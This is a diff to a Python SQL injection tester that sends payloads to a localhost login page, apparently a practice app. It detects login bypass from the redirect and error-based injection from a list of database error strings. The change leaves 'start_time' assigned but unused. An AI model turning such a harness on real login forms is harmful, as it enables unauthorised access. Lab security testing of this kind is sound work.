@@ -1,9 +1,10 @@
 import requests
 import time
 
-def test_payload(payload, start_time):
+def test_payload(payload, disc_time):
     url = "http://localhost:8080/index.php?page=login.php"
     session = requests.Session()
+    start_time = time.time()
 
     data = {
         "username": payload,
@@ -14,7 +15,7 @@ def test_payload(payload, start_time):
     try:
         response = session.post(url, data=data, timeout=5, allow_redirects=False)
         location = response.headers.get("Location", "")
-        elapsed_time = time.time() - start_time
+        elapsed_time = time.time() - disc_time
 
         # Check for successful login bypass.
         if "popUpNotificationCode=AU1" in location:
@@ -22,8 +23,10 @@ def test_payload(payload, start_time):
         
         # Check for error-based SQL injection.
         elif any(keyword.lower() in response.text.lower () for keyword in [
-            "sql syntax", "mysql_fetch", "mysql_", "uncaught exception", "error in your SQL syntax", "syntax error", "database error", "invalid query", "no such table", "no such column", "unknown column", "unknown table",
-            "warning: mysql", "warning: mysqli", "warning: pgsql", "warning: pdo", "warning: sqlite", "error: mysql", "error: mysqli", "error: pgsql", "error: pdo", "error: sqlite"
+            "sql syntax", "mysql_fetch", "mysql_", "uncaught exception", "error in your SQL syntax", "syntax error",
+            "database error", "invalid query", "no such table", "no such column", "unknown column", "unknown table",
+            "warning: mysql", "warning: mysqli", "warning: pgsql", "warning: pdo", "warning: sqlite", "error: mysql",
+            "error: mysqli", "error: pgsql", "error: pdo", "error: sqlite"
         ]):
             return "Success(S): Payload successfully showed Error-based SQL injection."
         
